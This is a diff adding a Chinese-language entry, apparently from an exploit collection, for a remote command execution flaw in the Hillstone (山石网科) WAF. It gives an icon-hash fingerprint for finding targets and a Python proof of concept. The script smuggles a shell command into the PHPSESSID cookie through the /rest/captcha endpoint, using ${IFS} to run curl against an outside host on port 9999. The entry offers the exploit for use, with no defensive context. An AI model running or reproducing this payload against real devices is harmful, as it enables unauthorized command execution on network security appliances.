@@ -1,0 +1,27 @@
+# 山石网科WAF远程代码执行漏洞
+
+- **系统**：山石网科WAF远程　|　**类型**：命令执行　|　**CVE**：—
+- **指纹**：`icon_hash="-839455805"`
+
+**请求体 / payload**
+```
+import requests,sys
+requests.packages.urllib3.disable_warnings()
+session = requests.Session()
+target = "https://192.168.247.196/".strip("/")
+cmd="curl\x24{IFS}192.168.247.1:9999/ccccsh"
+url = target+"/rest/captcha"
+headers = {"Accept":"*/*","User-Agent": "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)","Accept-Language":"en;q=0.9"}
+sss=requests.get(url,headers=headers,verify=False)
+if "PNG" not  in sss.content:
+print("target not vuln")
+sys.exit()
+cookies = {"PHPSESSID":"aaaaaaaaaa%3b"+cmd+"%3bd"}
+try:
+response = session.get(target+"/rest/captcha", headers=headers, cookies=cookies,verify=False,timeout=5)
+except requests.exceptions.ReadTimeout:
+print("payload work")
+sys.exit()
+print("payload send!")
+```
+- **预期**：200　|　—
